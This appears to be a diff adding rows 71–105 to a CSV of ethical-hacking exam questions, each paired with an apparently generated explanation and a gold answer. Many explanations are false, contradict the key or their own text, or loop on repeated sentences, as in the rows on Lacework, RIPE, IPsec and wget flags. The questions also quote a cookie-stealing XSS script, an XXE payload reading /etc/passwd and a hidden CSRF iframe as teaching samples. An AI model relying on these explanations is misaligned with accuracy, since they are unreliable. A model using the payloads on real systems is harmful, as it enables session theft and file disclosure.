+71,"Lewis, a professional hacker, targeted the loT cameras and devices used by a target venture-capital firm. He
+used an information-gathering tool to collect information about the loT devices connected to a network, open
+ports and services, and the attack surface area. Using this tool, he also generated statistical reports on broad
+usage patterns and trends. This tool helped Lewis continually monitor every reachable server and device on the
+Internet, further allowing him to exploit these devices in the network. Which of the following tools was
+employed by Lewis in the above scenario?
+A.  Censys
+B.  Wapiti
+C.  NeuVector
+D.  Lacework
+","Question: D. Lacework is a cloud-based security service that collects network data and generates reports. It’s used to
+monitor a target’s network and provide a view of their attack surface, allowing for continuous monitoring of the
+network. The tool is used to gather information about a target’s network and vulnerabilities and is not used for
+exploitation. In this case, Lewis used the tool to generate statistical reports on the network, not to exploit the
+network. Censys and Wapiti are both penetration testing tools, but they are not used for information gathering.
+Lacework is a cloud-based security service that collects network data and generates reports. It’s used to
+monitor a target’s network and provide a view of their attack surface, allowing for continuous monitoring of the
+network. The tool is used to gather information about a target’s network and vulnerabilities and is not used for
+exploitation. In this case, Lewis used the tool to generate statistical reports on the network",A
+72,"Rebecca, a security professional, wants to authenticate employees who use web services for safe and secure
+communication. In this process, she employs a component of the Web Service Architecture, which is an
+extension of SOAP, and it can maintain the integrity and confidentiality of SOAP messages.
+Which of the following components of the Web Service Architecture is used by Rebecca for securing the
+communication?
+A.  WSDL
+B.  WS Work Processes
+C.  WS-Policy
+D.  WS-Security
+","The WS-Security component of the Web Service Architecture is used to implement security mechanisms
+such as authentication and encryption. In order to implement security mechanisms, the Web Service Architecture
+requires a set of security mechanisms to be deployed. The WS-Security component is the set of mechanisms
+used to implement security mechanisms. It is composed of the following:
+•  WSDL, which is used for describing the Web services
+•  WS-Policy, which is used for describing security policies
+•  WS-Security, which is used for implementing security mechanisms
+•  WS-Trust, which is used for managing trust relationships
+•  WS-Trust, which is used for managing trust relationships
+The WS-Policy component is a policy that defines security policies. The WS-Security component is used to
+implement security mechanisms such as authentication and encryption. The WS-Trust component is used to
+manage trust relationships. The WS-Trust component is used to manage trust relationships. The WS-Security",D
+73,"The network users are complaining because their system are slowing down. Further, every time they attempt to
+go a website, they receive a series of pop-ups with advertisements. What types of malware have the system
+been infected with?
+A.  Virus
+B.  Spyware
+C.  Trojan
+D.  Adware
+","This is a question about cybersecurity. Please write an answer.
+
+ B, C, D.  Trojan horse malware is a type of malware that disguises itself as something legitimate and harmless, and
+then attempts to perform malicious actions on the system. In this case, the system is infected with a Trojan horse that
+sends pop-ups and advertisements to the users. The malware is not a virus, spyware, or adware. A virus is a type of malware
+that attempts to infect a system with malicious code. Spyware is software that collects data without the user’s knowledge.
+Adware is software that displays advertisements to the user. The system has been infected with a Trojan horse, but
+the malware is not a virus, spyware, or adware. A virus is a type of malware that infects a system and then attempts to
+spread itself by infecting other systems. Spyware is software that collects data without the user’s knowledge.
+Adware is software that displays",D
+74,"Geena, a cloud architect, uses a master component in the Kubernetes cluster architecture that scans newly
+generated pods and allocates a node to them. This component can also assign nodes based on factors such as
+the overall resource requirement, data locality, software/hardware/policy restrictions, and internal workload
+interventions.
+Which of the following master components is explained in the above scenario?
+A.  Kube-controller-manager
+B.  Kube-scheduler
+C.  Kube-apiserver
+D.  Etcd cluster
+","This is a good question about Kubernetes. The kube-controller-manager is a component that runs on the master node.
+It is responsible for controlling the lifecycle of pods and other Kubernetes resources. The kube-scheduler is responsible
+for assigning nodes to pods. The kube-apiserver is responsible for providing the Kubernetes API. The etcd cluster is a key
+component in the Kubernetes architecture, but it is not a master component. The etcd cluster is a key/value store that
+maintains the state of the Kubernetes cluster and provides data persistence. It is not responsible for controlling the
+lifecycle of pods or other Kubernetes resources.
+
+### {""A"": ""Kube-controller-manager"", ""B"": ""Kube-scheduler"", ""C"": ""Kube-apiserver"", ""D"": ""Etcd cluster""}
+
+### A, B, C, D. The kube-controller-manager is a component in the Kubernetes architecture that controls the lifecycle of pods
+and other Kubernetes resources. The kube-scheduler is",B
+75,"Calvin, a software developer, uses a feature that helps him auto-generate the content of a web page without
+manual involvement and is integrated with SSI directives. This leads to a vulnerability in the developed web
+application as this feature accepts remote user inputs and uses them on the page. Hackers can exploit this
+feature and pass malicious SSI directives as input values to perform malicious activities such as modifying and
+erasing server files. What is the type of injection attack Calvin's web application is susceptible to?
+A.  Server-side template injection
+B.  Server-side JS injection
+C.  CRLF injection
+D.  Server-side includes injection
+","Question:
+ A, B, C. SSI (Server-side includes) is used to include content from another web page into a web page. This allows
+the developer to include a file without having to write any HTML code. The content is provided by the remote web
+server. This is a type of injection attack. Server-side template injection is a type of injection attack that
+allows the hacker to inject code on the server side. It involves using a web page to insert malicious code into
+a web page. This can be used to modify the content of the page. CRLF injection is a type of injection attack that
+involves injecting carriage return and line feed characters into a web page. This can be used to bypass
+security measures and insert additional content. Server-side includes are used to include content from another web
+site into a web page. This is a type of injection attack.
+A is incorrect because server-side includes do not involve injection attacks.
+B is incorrect because",D
+76,"In an attempt to damage the reputation of a competitor organization, Hailey, a professional hacker, gathers a
+list of employee and client email addresses and other related information by using various search engines,
+social networking sites, and web spidering tools. In this process, she also uses an automated tool to gather a
+list of words from the target website to further perform a brute-force attack on the previously gathered email
+addresses.
+What is the tool used by Hailey for gathering a list of words from the target website?
+A.  Shadowsocks
+B.  CeWL
+C.  Psiphon
+D.  Orbot
+","The tool used to gather a list of words is CeWL, which is a tool that can gather a list of words from a target website
+and then use those words as a starting point for a brute-force attack. This is a common practice in hacking, and it is
+used to gather information from websites to use in a brute-force attack. In this case, the tool is used to gather a list
+of words from a website, which can then be used to launch a brute-force attack. The tool is also used to gather
+information from social networking sites, but it is not used for gathering words from a website.
+A, B, D. CeWL is a tool that gathers a list of words from a target website. It is used to gather information from
+a website, but it is not used for gathering words from a website.
+CEH Certified Ethical Hacker Practice Exams
+A, B, D. Orbot is a tool used to help users access the",B
+77,"On performing a risk assessment, you need to determine the potential impacts when some of the critical
+business processes of the company interrupt its service.
+What is the name of the process by which you can determine those critical businesses?
+A.  Emergency Plan Response (EPR)
+B.  Business Impact Analysis (BIA)
+C.  Risk Mitigation
+D.  Disaster Recovery Planning (DRP)
+","This is a question about cybersecurity. Please write an answer.
+
+  A. The Business Impact Analysis (BIA) is the process by which you determine the potential impacts when some of the critical
+business processes of the company interrupt its service. BIA is used as a business continuity and business
+resilience planning tool.
+A BIA is a process by which you determine the potential impacts when some of the critical business processes of the
+company interrupt its service. BIA is used as a business continuity and business resilience planning tool.
+BIA is not a disaster recovery plan.
+A disaster recovery plan is a document that outlines the steps to be taken in the event of a disaster.
+A business impact analysis is a process by which you determine the potential impacts when some of the critical
+business processes of the company interrupt its service.
+A business continuity plan is a document that outlines the steps to be taken in the event of a business
+continuity incident.
+A business continuity plan is a document that",B
+78,"You are a penetration tester and are about to perform a scan on a specific server. The agreement that you
+signed with the client contains the following specific condition for the scan: ?The attacker must scan every
+port on the server several times using a set of spoofed sources IP addresses. ? Suppose that you are using
+Nmap to perform this scan. What flag will you use to satisfy this requirement?
+A.  The -A flag
+B.  The -g flag
+C.  The -f flag
+D.  The -D flag
+","Question:
+A. This is a bit of a tricky one, and one that you will see on the exam. In the question, you’re asked to
+specify the flag that you will use to satisfy the condition that the attacker must scan every port on the server
+several times. In this case, the -A flag is used for performing a SYN scan, which is the most common type of
+attack used in the social engineering arena. The -A flag is not used for scanning every port on the server.
+A and B are incorrect because the -g flag is used to specify the number of packets to send, and the -f flag is used
+to specify the number of packets to receive. The -D flag is used to specify the number of threads to use.
+A is incorrect because the -f flag is used to specify the number of threads to use. The -D flag is not used for
+scanning. The -D flag is used to specify the",D
+79,"You are a security officer of a company. You had an alert from IDS that indicates that one PC on your Intranet
+is connected to a blacklisted IP address (C2 Server) on the Internet. The IP address was blacklisted just before
+the alert. You are starting an investigation to roughly analyze the severity of the situation. Which of the
+following is appropriate to analyze?
+A.  IDS log
+B.  Event logs on domain controller
+C.  Internet Firewall/Proxy log.
+D.  Event logs on the PC
+","Question: C. The event logs on the domain controller will provide information about events on the domain, which may or may not
+include information about the IP addresses you are looking for. The Internet firewall/proxy logs will have information about
+traffic going in and out of the domain. The IDS log will have information about events on the domain, which may or may not
+include information about the IP addresses you are looking for. The event logs on the PC will not have any information about
+the IP addresses you are looking for. The only place to look for information about IP addresses is the Internet firewall/proxy
+log. The event logs on the domain controller will not provide information about the IP addresses you are looking for. The
+only place to look for information about the IP addresses you are looking for is the Internet firewall/proxy log. If you want
+to look for information about the IP addresses you are looking for, you would use the event logs on the PC.
+A,",C
+80,"Jack, a disgruntled ex-employee of Incalsol Ltd., decided to inject fileless malware into Incalsol's systems. To
+deliver the malware, he used the current employees' email IDs to send fraudulent emails embedded with
+malicious links that seem to be legitimate. When a victim employee clicks on the link, they are directed to a
+fraudulent website that automatically loads Flash and triggers the exploit. What is the technique used byjack to
+launch the fileless malware on the target systems?
+A.  In-memory exploits
+B.  Phishing
+C.  Legitimate applications
+D.  Script-based injection
+","B. Script-based injection is the technique used by Jack to launch the fileless malware on the target systems. Script-based
+injection is when a program is injected into the target system using a program that runs in the background and is
+controlled by a script. The script is used to launch the exploit. The script is executed by the operating system and
+does not need to be installed on the target system. The script is not embedded with a malicious link. Script-based
+injection is not used in fileless malware attacks.
+A is incorrect because an in-memory exploit is used in fileless malware attacks. An in-memory exploit is a program that
+injects code into the target system and runs it without the need for a bootable media. The program is injected into
+memory, and the system is rebooted, allowing the exploit to run.
+C is incorrect because phishing is not used in fileless malware",B
+81,"George, an employee of an organization, is attempting to access restricted websites from an official computer.
+For this purpose, he used an anonymizer that masked his real IP address and ensured complete and continuous
+anonymity for all his online activities. Which of the following anonymizers helps George hide his activities?
+A.  https://www.baidu.com
+B.  https://www.guardster.com
+C.  https://www.wolframalpha.com
+D.  https://karmadecay.com
+","Question: A. The best choice here is  https://www.guardster.com. This is an anonymizer that is designed to
+hide your IP address and make it appear as if you are in a different location. It does not provide access to restricted
+sites, and it doesn’t offer the same features as a proxy. It also doesn’t encrypt your traffic, which is important for
+anonymity. It’s a good choice for anyone who wants to make sure their traffic is not traced back to them.
+B is incorrect because  https://karmadecay.com is a website that provides access to restricted sites.
+C is incorrect because  https://wolframalpha.com is a website that provides access to a variety of math-related
+information.
+D is incorrect because  https://www.wolframalpha.com is a website that provides access to a variety of math-related
+information. It does not provide access to restricted sites.",B
+82,"Which wireless security protocol replaces the personal pre-shared key (PSK) authentication with Simultaneous
+Authentication of Equals (SAE) and is therefore resistant to offline dictionary attacks?
+A.  WPA3-Personal
+B.  WPA2-Enterprise
+C.  Bluetooth
+D.  ZigBee
+","# C. WPA3-Personal is a WPA3 protocol that is the successor to WPA2-Personal, which was the successor to WPA2-Enterprise. It provides enhanced security by using a Shared Key Authentication Protocol (SAE) for authentication. SAE is a method of using a key exchange to authenticate users. SAE is designed to be resistant to offline dictionary attacks. The other protocols listed are not. Bluetooth is a wireless technology that uses radio waves to communicate. Zigbee is a low-power wireless technology that is used for low-power, low-latency, and low-cost networking. It is not a security protocol.",A
+83,"When you are testing a web application, it is very useful to employ a proxy tool to save every request and
+response. You can manually test every request and analyze the response to find vulnerabilities. You can test
+parameter and headers manually to get more precise results than if using web vulnerability scanners.
+What proxy tool will help you find web vulnerabilities?
+A.  Maskgen
+B.  Dimitry
+C.  Burpsuite
+D.  Proxychains
+","Question: A. Proxychains is a tool that can be used to set up a proxy server for a test. It can be used to save
+every request and response to the file for analysis. It is a proxy server that uses HTTP and HTTPS to communicate
+with the server. It doesn’t do anything with the data, so it doesn’t do any of the scanning you would do
+with a scanner. It doesn’t have a built-in vulnerability scanner. It does, however, have a built-in
+proxy server. This is a very useful tool for testing a web application. Maskgen is a tool for generating
+passwords. Dimitry is a tool for generating dynamic content. Burpsuite is a tool for testing web applications.
+Proxychains is a tool for setting up a proxy server. It doesn’t do anything with the data, so it doesn’t do
+any of the scanning you would do with a scanner. It doesn’t have a built-in vulnerability scanner. It",C
+84,"A ""Server-Side Includes"" attack refers to the exploitation of a web application by injecting scripts in HTML
+pages or executing arbitrary code remotely.
+Which web-page file type, if it exists on the web server, is a strong indication that the server is vulnerable to
+this kind of attack?
+A.  .stm
+B.  .html
+C.  .rss
+D.  .cms
+","This is a question about cybersecurity. Please write an answer.
+
+ B is incorrect because the.css file type is used for Cascading Style Sheets, which are used to style HTML
+documents. The.jsp file type is used for Java servlets. The.js file type is used for JavaScript.
+A, D, and E are incorrect because the file types listed are not used for web pages.",A
+85,"You have compromised a server on a network and successfully opened a shell. You aimed to identify all
+operating systems running on the network. However, as you attempt to fingerprint all machines in the network
+using the nmap syntax below, it is not going through.
+invictus@victim_server.~$ nmap -T4 -O 10.10.0.0/24 TCP/IP fingerprinting (for OS scan) xxxxxxx xxxxxx
+xxxxxxxxx. QUITTING!
+What seems to be wrong?
+A.  The nmap syntax is wrong.
+B.  This is a common behavior for a corrupted nmap application.
+C.  The outgoing TCP/IP fingerprinting is blocked by the host firewall.
+D.  OS Scan requires root privileges.
+","This is a very common question on the certification exams. The syntax is incorrect and will not run on a compromised
+server. The syntax is as follows:
+nmap -T4 -O 10.10.0.0/24
+The -T4 indicates TCP port scanning, and -O indicates OS fingerprinting. The -O option is used to get the operating
+system fingerprinting. The -T4 option is for TCP port scanning. The -O option is not for OS fingerprinting. The syntax
+is incorrect and will not run on a compromised server. The host firewall is blocking the OS scan because it’s
+not allowed by default. The OS scan is not blocked by default, so you’d have to add a rule to allow the OS scan
+by default. The OS scan is not blocked by default, so you’d have to add a rule to allow the OS scan by default.
+The OS scan is not blocked by default, so you’d have to",D
+86,"A penetration tester is performing the footprinting process and is reviewing publicly available information
+about an organization by using the Google search engine.
+Which of the following advanced operators would allow the pen tester to restrict the search to the
+organization?s web domain?
+A.  [allinurl:]
+B.  [location:]
+C.  [site:]
+D.  [link:]
+","# A is incorrect because the allinurl operator is used to search for information on the Internet. The
+location operator is used to search for information within a domain. The site operator is used to search for
+information on a specific website. The link operator is used to search for information on a specific
+website. The allinurl: operator restricts the search to information on a specific domain. The site: operator
+restricts the search to information on a specific website. The link: operator restricts the search to information
+on a specific website. The location: operator is used to restrict the search to information within a specific
+domain. The location: operator is used to restrict the search to information within a specific location.
+The link: operator is used to restrict the search to information on a specific website.
+A and C are incorrect because the allinurl: operator restricts the search to information on a specific domain. The
+site: operator restricts the search to information",C
+87,"Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices.
+Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic
+information about their network. When analyzing the results of her Whois search, Becky notices that the IP
+was allocated to a location in Le Havre, France. Which regional Internet registry should Becky go to for
+detailed information?
+A.  ARIN
+B.  APNIC
+C.  RIPE
+D.  LACNIC
+","The regional Internet registry that Becky should use to obtain information about the IP address is RIPE. RIPE is
+the regional Internet registry for the European Union. RIPE is the second largest Internet registry in the world. It is
+also the largest by number of members. RIPE is a member of the Internet Architecture Board (IAB). RIPE
+is the only regional Internet registry that does not have a regional top-level domain name, so it does not have
+its own TLD. RIPE is responsible for the management of the Internet infrastructure in Europe and is responsible for
+the European Internet. The RIPE region includes the countries of Belgium, France, Germany, Luxembourg, the Netherlands,
+Norway, and Switzerland. RIPE is not the regional Internet registry for the United States.
+A is incorrect because APNIC is the regional Internet registry for Australia and New Zealand. APNIC is the
+largest Internet registry in the world, with 5,000 members. APNIC",C
+88,"A company?s Web development team has become aware of a certain type of security vulnerability in their
+Web software. To mitigate the possibility of this vulnerability being exploited, the team wants to modify the
+software requirements to disallow users from entering HTML as input into their Web application.
+What kind of Web application vulnerability likely exists in their software?
+A.  Cross-site scripting vulnerability
+B.  SQL injection vulnerability
+C.  Web site defacement vulnerability
+D.  Gross-site Request Forgery vulnerability
+","The SQL injection vulnerability exists in the Web application and allows the attacker to inject SQL statements
+into the Web application to gain unauthorized access to the database. Web site defacement vulnerability is
+a vulnerability that allows an attacker to deface the site in some way. Gross-site Request Forgery is a vulnerability
+that allows an attacker to exploit the fact that the Web application may be sending a request to the browser to
+request a file, and then the attacker can modify the request and get the application to do something it
+otherwise would not do. This is not a vulnerability, but it is a related one. The Web application team wants to
+prevent the HTML from being entered into the Web application. This is not a vulnerability, but it is a related one.
+The Web application is being modified to prevent HTML from being entered into the application. This is not a
+vulnerability, but it is a related one. A cross-site scripting vulnerability allows an attacker to inject HTML into
+the",A
+89,"Which of the following provides a security professional with most information about the system?s security
+posture?
+A.  Phishing, spamming, sending trojans
+B.  Social engineering, company site browsing tailgating
+C.  Wardriving, warchalking, social engineering
+D.  Port scanning, banner grabbing service identification
+","C. This is the best question. It includes all the items that are associated with social engineering. It’s a good
+example of a social engineering attack, and it’s also a good example of a warchalking.
+A, B, and D are incorrect because these don’t include social engineering or warchalking. Social
+engineering is a term used to describe the process of gaining access to systems by pretending to be someone
+else. It’s a broad term that includes a number of tactics, but the main one is impersonation. Warchalking
+is a term used for the practice of leaving a trail of clues to lead a hacker to a target. A banner grabbing
+service is a tool that scans the web to identify open ports and open services. Port scanning is a tool that
+can be used to identify open ports on a system. This is not a social engineering attack. The term phishing",D
+90,"BitLocker encryption has been implemented for all the Windows-based computers in an organization. You are
+concerned that someone might lose their cryptographic key. Therefore, a mechanism was implemented to
+recover the keys from Active Directory. What is this mechanism called in cryptography?
+A.  Key archival
+B.  Key escrow.
+C.  Certificate rollover
+D.  Key renewal
+","# B. The certificate rollover is a method used to keep the keys current. It’s used in the PKI and is
+basically a method of rotating keys. In other words, the certificate is renewed. The key archival method is
+a way to store keys and provide a backup. Key escrow is a way to provide access to the keyholder in
+case of a loss of key. Key renewal is a method used to update keys. None of these are the correct
+answers for this question. The key archival method is used for a different purpose than the key escrow.
+The key renewal method is used to keep keys current. The certificate rollover method is used to rotate
+keys. The key escrow method is used to provide access to the keyholder in case of a loss of key.",B
+91,"What would be the purpose of running ""wget 192.168.0.15 -q -S"" against a web server?
+A.  Performing content enumeration on the web server to discover hidden folders
+B.  Using wget to perform banner grabbing on the webserver
+C.  Flooding the web server with requests to perform a DoS attack
+D.  Downloading all the contents of the web page locally for further examination
+","This is a simple question about web security. The purpose of this command is to perform content enumeration
+on the web server. This is done by using the -q switch to disable output and the -S switch to
+search for all the files on the server. The -q switch also tells wget to not display any output.
+The -S switch is used to search for all files on the server. The -q switch is used to disable output,
+and the -S switch is used to search for all files on the server. The -q switch is used to disable
+output, and the -S switch is used to search for all files on the server. The -q switch is used to
+disable output, and the -S switch is used to search for all files on the server. The -q switch is used
+to disable output, and the -S switch is used to search for all files on the server. The -q switch is used
+to disable output,",B
+92,"Judy created a forum, one day. she discovers that a user is posting strange images without writing comments.
+She immediately calls a security expert, who discovers that the following code is hidden behind those images:
+<script>
+document.writef<img src=""https://Ioca(host/submitcookie.php? cookie ='+ escape(document.cookie)+ "" />);
+</script>
+What issue occurred for the users who clicked on the image?
+A.  The code inject a new cookie to the browser.
+B.  The code redirects the user to another site.
+C.  The code is a virus that is attempting to gather the users username and password.
+D.  This php file silently executes the code and grabs the users session cookie and session ID.
+","This is a simple example of an XSS vulnerability. The script is inserted into the page using the
+document.write() method. The code in the script grabs the cookie and the session ID and then sends them
+to the server. The server can use the session ID to track the user. The user can then be tricked into
+submitting personal information to the server. In this case, the server would receive the user’s cookie and
+session ID, and the user would be taken to the site without any warning or explanation. The code
+in the script is designed to be executed on the server, not on the client. The code is also designed to
+execute the script in a browser, not a server. The script is designed to grab the cookie and session ID
+from the client, and then send them to the server. The script is designed to execute the script on the
+server, not the client. The script is designed to grab the cookie and session ID from the",D
+93,"Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides
+additional routing information in the SOAP header to support asynchronous communication. This further
+allows the transmission of web-service requests and response messages using different TCP connections.
+Which of the following attack techniques is used by Stella to compromise the web services?
+A.  XML injection
+B.  WS-Address spoofing
+C.  SOAPAction spoofing
+D.  Web services parsing attacks
+","This is a trick question. The answer is B. WS-Address spoofing is used to change the address of the web service
+being called, but it’s not used to compromise the web service. XML injection is used to inject malicious code
+into the XML message being sent to the web service. SOAPAction spoofing is used to change the SOAPAction
+header, which is used to indicate the web service being called. Web services parsing attacks are used to
+attempt to parse the web service to obtain information about it. None of these attack techniques are used to
+compromise the web service.",B
+94,"If executives are found liable for not properly protecting their company?s assets and information systems, what
+type of law would apply in this situation?
+A.  Criminal
+B.  International
+C.  Common
+D.  Civil
+","This is a common question, but the answer isn’t always straightforward. This is a question about
+law, but it isn’t a legal question. The law of the land can have a bearing on what liability would apply in a given
+situation, but it doesn’t have anything to do with the question. The question is asking you to identify the type of law
+that would apply to this scenario. The answer is a bit complicated because the law is all over the place.
+However, the civil law of the United States would apply to this scenario. The criminal law of the United States
+wouldn’t apply, as this is an international case. The common law of the United States would also not apply,
+as it would be a civil case. The answer is a civil law question, though, and the law of the land is the civil law of the
+United States, which is the law that applies to this scenario. The law of the land is the one you need to",D
+95,"An attacker changes the profile information of a particular user (victim) on the target website. The attacker
+uses this string to update the victim?s profile to a text file and then submit the data to the attacker?s database.
+<
+iframe src=??http://www.vulnweb.com/updateif.php?? style=??display:none??
+> < /iframe >
+What is this type of attack (that can use either HTTP GET or HTTP POST) called?
+A.  Browser Hacking
+B.  Cross-Site Scripting
+C.  SQL Injection
+D.  Cross-Site Request Forgery
+","Question: D. Cross-Site Request Forgery (CSRF) is a type of attack that exploits a flaw in the way a web application
+processes user input. The attacker sends a request to the server, which sends back a response to the browser. The
+browser then uses the response to update the user’s session information. The attacker can then submit false data to the
+server, which can be used to update the user’s session information, and the user will be affected by the false data.
+This attack can be used to perform a variety of actions, such as:
+• Spoofing a user
+• Accessing restricted resources
+• Administering a remote command
+• Submitting data to an application
+• Stealing session cookies
+• Exploiting a vulnerability in a web application
+In this attack, the attacker sends a request to the server, which sends back a response to the browser. The browser then uses the response to update the user’s session information",D
+96,"You start performing a penetration test against a specific website and have decided to start from grabbing all
+the links from the main page.
+What Is the best Linux pipe to achieve your milestone?
+A.  dirb https://site.com | grep ""site""
+B.  curl -s https://sile.com | grep ??< a href-\?http"" | grep ""Site-com- | cut -d ""V"" -f 2
+C.  wget https://stte.com | grep ""< a href=\*http"" | grep ""site.com""
+D.  wgethttps://site.com | cut-d""http-
+","This is a good question, but I’m going to have to disagree with you on the best option. The first two are not
+valid options because they do not contain a pipe. The third option is incorrect because it is using curl to grab
+the page, but it is not using a pipe. The fourth option is incorrect because wget is used to download
+a file, not a web page. The fifth option is incorrect because it is using a grep command to grab links.
+In all other respects, these are all incorrect. The best option is curl, which is used to download the
+page. However, you can’t just grab all the links from the main page. You need to filter for the link that
+you want. If you want to grab all links, you would use grep, not a pipe. If you want to grab all links
+with the word “site” in them, you would use grep. If you want to grab all links that are links to",C
+97,"Upon establishing his new startup, Tom hired a cloud service provider (CSP) but was dissatisfied with their
+service and wanted to move to another CSP.
+What part of the contract might prevent him from doing so?
+A.  Virtualization
+B.  Lock-in
+C.  Lock-down
+D.  Lock-up
+","D. Lock-up is the last part of the contract that prohibits the customer from terminating the contract without
+a penalty. In this case, the customer is not allowed to terminate the contract without a penalty, but there is no
+restriction on the CSP. This is because the contract is in the virtualization stage. The customer has no
+control over the virtualization infrastructure, so there is no physical infrastructure to terminate. Lock-in refers to
+the inability of the customer to move to another CSP without breaking the contract. In this case, the customer
+cannot move without a penalty. Lock-down refers to the ability of the customer to control the virtualization
+infrastructure. In this case, the customer can control the virtualization infrastructure, so there is no lock-down. Virtualization
+is the ability of the customer to manage the virtualization infrastructure. In this case, the customer can manage
+the virtualization infrastructure",B
+98,"In both pharming and phishing attacks, an attacker can create websites that look similar to legitimate sites with
+the intent of collecting personal identifiable information from its victims.
+What is the difference between pharming and phishing attacks?
+A.  In a pharming attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack, an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name
+B.  In a phishing attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack, an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name
+C.  Both pharming and phishing attacks are purely technical and are not considered forms of social engineering
+D.  Both pharming and phishing attacks are identical
+","The difference between the two is the method of attack. In a pharming attack, the attacker creates a website that looks like a legitimate website, but the URL is misspelled or similar to the actual site. In a phishing attack, the attacker provides the victim with a URL that is either misspelled or looks similar to the actual website. The attacker does not create the site himself or herself, but instead uses a service provider to host the site. The service provider is responsible for providing the URL to the victim, and the attacker simply provides the victim with the URL.
+A is incorrect because in a pharming attack, the attacker does not collect personal information from the victim. In a phishing attack, the attacker collects personal information from the victim.
+C is incorrect because in a pharming attack, the attacker does not collect personal information from the victim. In a phishing attack, the attacker provides the victim with a URL that is either misspelled or looks similar to the actual website.",A
+99,"Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity
+and navigate anonymously to obtain sensitive/hidden information about official government or federal
+databases. After gathering the Information, he successfully performed an attack on the target government
+organization without being traced. Which of the following techniques is described in the above scenario?
+A.  Dark web footprinting
+B.  VoIP footpnnting
+C.  VPN footprinting
+D.  website footprinting
+","This is a trick question.  You may think that it’s a trick question because the answer is in the question. However, it’s not. The
+answer is D.  VoIP is a protocol that allows you to place voice calls over the Internet.  It’s not a search engine, and it’s
+not a way to “footprint” a website.  This is a question about cyber security.  The answer is D.  This is a question about
+information security, not information gathering.  The other answers are incorrect because they are not true.  Dark web footprinting
+is a technique used to gather information about the dark web.  VoIP is a protocol used for voice communication over the
+Internet.  VPN is a protocol used for creating virtual private networks, and website footprinting is a technique used to
+identify and track web activity.  The information gathering question is asking you to identify the different techniques used
+to gather information, and all",A
+100,"When considering how an attacker may exploit a web server, what is web server footprinting?
+A.  When an attacker implements a vulnerability scanner to identify weaknesses
+B.  When an attacker creates a complete profile of the site's external links and file structures
+C.  When an attacker gathers system-level data, including account details and server names
+D.  When an attacker uses a brute-force attack to crack a web-server password
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D. web server footprinting is a method used by attackers to gather information about a
+server’s system configuration, including the operating system, installed software, and
+hardware configuration. This information is gathered through various means, including
+monitoring network traffic, using tools such as netstat and nmap, and even by
+running a vulnerability scanner. Web server footprinting is often used to identify weaknesses
+in the configuration of web servers, and is a common method used by attackers to gain
+access to sensitive information on a server. In addition to gathering information about the
+operating system and installed software, web server footprinting can also include gathering
+information about the network traffic, including the protocol and port numbers being used.
+This is done by using tools such as nmap or nmap-ng, which are designed specifically
+for this purpose. Web server footprinting can also be used to gather information",B
+101,"Harris is attempting to identify the OS running on his target machine. He inspected the initial TTL in the IP
+header and the related TCP window size and obtained the following results:
+TTL: 64 Window Size: 5840
+What is the OS running on the target machine?
+A.  Solaris OS
+B.  Windows OS
+C.  Mac OS
+D.  Linux OS
+","The initial TTL in the IP header is an aging mechanism that indicates the number of times the packet has been
+delivered to a router. The window size is a TCP window size, which is the number of bytes available for
+sending. In this case, the window size is 5840 bytes. The OS is Linux. The TTL and window size are not
+indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
+indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
+indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
+indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
+indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
+indicators of the OS",D
+102,"Which protocol is used for setting up secure channels between two devices, typically in VPNs?
+A.  PEM
+B.  ppp
+C.  IPSEC
+D.  SET
+","This is a question about cybersecurity. Please write an answer.
+
+ C. IPsec is the protocol used in VPNs. It’s a security protocol that uses encryption and key exchange to establish a secure channel between two devices. The protocol is designed to be used over an IP network, but can also be used over other types of networks. It is a proprietary protocol, meaning that it is not open source. PEM is a format used to encrypt data, and it is not a protocol used in VPNs. SET is a protocol used in set-up and teardown of VPN connections. PPP is a protocol used for setting up a connection between two devices. It is not used for security purposes and is not open source.",C
+103,"Peter, a system administrator working at a reputed IT firm, decided to work from his home and login remotely.
+Later, he anticipated that the remote connection could be exposed to session hijacking. To curb this possibility,
+he implemented a technique that creates a safe and encrypted tunnel over a public network to securely send
+and receive sensitive information and prevent hackers from decrypting the data flow between the endpoints.
+What is the technique followed by Peter to send files securely through a remote connection?
+A.  DMZ
+B.  SMB signing
+C.  VPN
+D.  Switch network
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D. A DMZ is a virtual network that provides a network for public-facing services, such as web servers and
+mail servers. The DMZ is created by placing a firewall on the outside of the network, with the purpose of
+allowing traffic from the outside world to reach the internal network without being blocked by the firewall. The
+firewall is set up to allow access to the DMZ, and all traffic is encrypted. The DMZ is used to provide a
+secure, encrypted connection to internal networks and to allow the public to access internal systems. It is
+not used for sensitive information transfer. The VPN is a virtual private network, which is a secure network
+created over the public internet. The VPN uses encryption and authentication to provide a secure connection
+between two computers. The switch network is a physical network that connects multiple switches together. The
+switches are connected to a network switch",C
+104,"Which of the following web vulnerabilities would an attacker be attempting to exploit if they delivered the
+following input?
+<!DOCTYPE blah [ < IENTITY trustme SYSTEM ""file:///etc/passwd"" > ] >
+A.  XXE
+B.  SQLi
+C.  IDOR
+D.  XXS
+","This is a bit of a tough one. The XXE vulnerability is a remote code execution vulnerability that occurs when a user
+provides an input string to a web application that is expecting it to be a valid XML file. The system then
+uses that input string to create a shell command that is executed on the server. It’s a bit of a catch-22, because the
+system needs to be able to accept XML, but the user is expected to provide a valid XML file. This is a bit
+of a difficult one because there are so many potential answers. The best way to think about it is to remember that
+XML is a markup language, and markup languages are used to add structure to a document. This is a bit like
+using HTML to describe a document. The system needs to be able to parse the XML and understand the structure.
+If the system is expecting XML, and the user provides an input string that is not valid XML, the system will
+not",A
+105,"While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to
+determine whether the firewall is stateful or stateless, which of the following options would be best to use?
+A.  -sA
+B.  -sX
+C.  -sT
+D.  -sF
